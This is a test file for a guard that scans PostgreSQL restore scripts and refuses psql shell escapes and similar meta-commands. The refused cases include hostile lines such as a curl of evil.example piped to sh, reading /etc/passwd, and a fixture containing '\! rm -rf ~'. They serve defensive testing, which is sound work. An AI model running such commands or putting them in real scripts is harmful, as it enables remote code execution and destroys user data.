import { mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { gzipSync } from 'node:zlib';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { describePsqlProblem, judgePsqlLine, scanPsqlScript } from './psql-script-guard';

describe('judgePsqlLine (SC-16)', () => {
  it.each([
    '\\! curl evil.example | sh',
    '  \\! id',
    'SELECT 1 \\! id',
    '\\o | tee /tmp/x',
    'SELECT 1 \\g | sh',
    "\\copy t to program 'cat'",
    '\\i /etc/passwd',
    '\\set x `id`',
    '\\echo `curl evil|sh`',
    '\\cd /',
  ])('refuses %j', (line) => {
    expect(judgePsqlLine(line)).not.toBeNull();
  });

  it.each([
    'SELECT 1;',
    '\\connect mydb',
    '\\c mydb',
    '\\.',
    '\\restrict abcDEF123',
    '\\unrestrict abcDEF123',
    '\\N\tsomething',
    '\\\\server\\share',
    "INSERT INTO t VALUES ('C:\\temp\\x');",
    '\\tfirst-column-starts-with-a-tab-escape\tx',
  ])('allows %j', (line) => {
    expect(judgePsqlLine(line)).toBeNull();
  });
});

describe('scanPsqlScript', () => {
  let dir: string;
  beforeAll(async () => {
    dir = await mkdtemp(join(tmpdir(), 'plasma-psql-'));
  });
  afterAll(async () => {
    await rm(dir, { recursive: true, force: true });
  });

  it('accepts an ordinary pg_dump-style script', async () => {
    const f = join(dir, 'ok.sql');
    await writeFile(
      f,
      'SET statement_timeout = 0;\nCREATE TABLE t (a int);\nCOPY t (a) FROM stdin;\n1\n\\N\n\\.\n',
    );
    expect(await scanPsqlScript(f, false)).toBeNull();
  });

  it('finds a shell escape and reports its line, also inside a .gz', async () => {
    const body = 'SELECT 1;\n\n\\! rm -rf ~\nSELECT 2;\n';
    const plain = join(dir, 'evil.sql');
    await writeFile(plain, body);
    const gz = join(dir, 'evil.sql.gz');
    await writeFile(gz, gzipSync(body));
    for (const [path, gunzip] of [
      [plain, false],
      [gz, true],
    ] as const) {
      const problem = await scanPsqlScript(path, gunzip);
      expect(problem?.line).toBe(3);
      expect(describePsqlProblem(problem as never)).toMatch(/Restore refused: line 3/);
    }
  });
});
